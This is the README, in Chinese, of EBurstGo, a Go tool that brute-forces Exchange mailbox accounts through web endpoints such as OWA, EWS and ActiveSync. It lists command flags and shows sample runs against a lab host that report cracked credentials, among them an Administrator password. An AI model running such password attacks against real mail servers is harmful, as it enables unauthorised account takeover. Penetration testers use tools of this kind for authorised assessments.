# EBurstGo

利用 Exchange 服务器 Web 接口爆破邮箱账户

参考 [grayddq/EBurst](https://github.com/grayddq/EBurst) 项目利用 Go 语言进行重构

支持接口

```shell
/autodiscover
/owa/auth.owa # OWA & ECP
/ews
/mapi
/oab
/rpc
/Microsoft-Server-ActiveSync
/powershell # 后期支持
```

## Usage

usage

```shell
Usage of ./EBurstGo:
  -check
    	检查目标 Exchange 服务器可用接口
  -domain string
    	AD 域名
  -mode string
    	指定 Exchange 服务器接口
  -pass string
    	密码字典
  -thread int
    	协程数量 (default 2)
  -url string
    	Exchange 服务器地址
  -user string
    	用户名字典
```

check

```shell
$ ./EBurstGo -url https://192.168.30.11 -check
[+] 存在 owa 接口 (/owa/auth.owa), 可以爆破
[+] 存在 powershell 接口 (/powershell), 可以爆破
[+] 存在 ecp 接口 (/owa/auth.owa), 可以爆破
[+] 存在 autodiscover 接口 (/autodiscover), 可以爆破
[+] 存在 mapi 接口 (/mapi), 可以爆破
[+] 存在 activesync 接口 (/Microsoft-Server-ActiveSync), 可以爆破
[+] 存在 oab 接口 (/oab), 可以爆破
[+] 存在 ews 接口 (/ews), 可以爆破
[+] 存在 rpc 接口 (/rpc), 可以爆破
```

brute

```shell
$ ./EBurstGo -url https://192.168.30.11 -domain hack-my.com -user users.txt -pass pass.txt -mode ews
[*] 使用 ews 接口爆破: https://192.168.30.11
[+] 成功: Administrator:abcd1234!@#$
[+] 成功: Alice:Alice123!
[+] 成功: Bob:Bob123!
[+] 成功: Marry:Marry123!
[*] 耗时: 4.40084275s
```

协程数不建议开太大, 可能会漏报 (待解决?)

等后面有时间修一修 bug, 还有优化代码结构